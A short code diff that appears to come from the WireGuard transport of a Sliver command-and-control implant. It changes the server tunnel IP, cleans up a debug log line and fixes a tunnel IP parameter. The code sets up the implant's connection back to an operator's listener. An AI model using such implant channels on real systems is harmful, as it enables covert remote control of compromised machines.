@@ -44,7 +44,7 @@ import (
 )
 
 var (
-	serverTunIP           = "192.168.174.1" // Don't let user configure this for now
+	serverTunIP           = "100.64.0.1" // Don't let user configure this for now
 	serverTunPort         = 8888
 	serverKeyExchangePort = 1337
 )
@@ -172,14 +172,14 @@ func wgSocketConnect(address string, port uint16) (net.Conn, *device.Device, err
 	}
 
 	// {{if .Config.Debug}}
-	log.Printf("Successfully connected to sliver listener: %v", err)
+	log.Printf("Successfully connected to sliver listener")
 	// {{end}}
 	return connection, dev, nil
 }
 
 func bringUpWGInterface(address string, port uint16, implantPrivKey string, serverPubKey string, netstackTunIP string) (tun.Device, *device.Device, *netstack.Net, error) {
 	tun, tnet, err := netstack.CreateNetTUN(
-		[]net.IP{net.ParseIP(wgPeerTunIP)},
+		[]net.IP{net.ParseIP(netstackTunIP)},
 		[]net.IP{net.ParseIP("127.0.0.1")},
 		1420)
 	if err != nil {
